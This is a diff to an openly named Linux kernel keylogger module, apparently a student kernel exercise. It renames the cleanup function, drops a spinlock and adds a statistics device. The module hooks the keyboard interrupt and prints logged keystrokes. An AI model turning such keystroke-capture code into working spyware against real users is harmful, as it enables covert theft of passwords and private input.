@@ -24,8 +24,6 @@ static struct key_map		*key_shift_right;
 static struct key_log_index	*key_full_log;
 static struct workqueue_struct	*workqueue;
 
-DEFINE_SPINLOCK(slock);
-
 /* -------------------- UTILITY FUNCTIONS SECTION ----------------------------*/
 
 static struct key_log_index	*key_log_create_page(struct key_log_index *next)
@@ -310,7 +308,7 @@ static void	key_logprint_smart(struct key_log_entry *log, void *ptr)
 		pr_info(KERN_CONT "%c", ascii);
 }
 
-static int		keylogger_cleaner(const size_t flags, const int retval)
+static int		cleanner(const size_t flags, const int retval)
 {
 	if (flags & KFLAG_DEV) {
 		pr_info("unregistering device.\n");
@@ -320,6 +318,8 @@ static int		keylogger_cleaner(const size_t flags, const int retval)
 		pr_info("unregistering bonus device.\n");
 		misc_deregister(&dev_bonus);
 	}
+	if (flags & KFLAG_DEVSTATS)
+		stats_exit();
 	if (flags & KFLAG_IRQ) {
 		pr_info("releasing irq.\n");
 		free_irq(KEYBOARD_IRQ, &key_handler);
@@ -335,7 +335,7 @@ static int		keylogger_cleaner(const size_t flags, const int retval)
 static void		__exit keylogger_clean(void)
 {
 	pr_info(MODULE_NAME "Cleaning up module.\n");
-	keylogger_cleaner(KFLAG_DEV | KFLAG_DEVBONUS | KFLAG_IRQ, 0);
+	cleanner(KFLAG_DEV | KFLAG_DEVBONUS | KFLAG_IRQ, 0);
 	key_log_iter(&key_logprint_smart, NULL);
 	key_log_clean();
 	pr_info(MODULE_NAME " removed.\n");
@@ -358,17 +358,22 @@ static int		__init hello_init(void)
 			  &key_handler);
 	if (ret < 0) {
 		pr_err("failed to request keyboard irq: %d\n", ret);
-		return keylogger_cleaner(KFLAG_NONE, -ENOMEM);
+		return cleanner(KFLAG_NONE, -ENOMEM);
 	}
 	ret = misc_register(&dev);
 	if (ret < 0) {
 		pr_err("failed to register device.\n");
-		return keylogger_cleaner(KFLAG_IRQ, ret);
+		return cleanner(KFLAG_IRQ, ret);
 	}
 	ret = misc_register(&dev_bonus);
 	if (ret < 0) {
 		pr_err("failed to register bonus device\n");
-		return keylogger_cleaner(KFLAG_IRQ | KFLAG_DEV, ret);
+		return cleanner(KFLAG_IRQ | KFLAG_DEV, ret);
+	}
+	ret = stats_init();
+	if (ret < 0) {
+		pr_err("failed to register stats device.\n");
+		return cleanner(KFLAG_IRQ | KFLAG_DEV | KFLAG_DEVBONUS, ret);
 	}
 	return 0;
 }
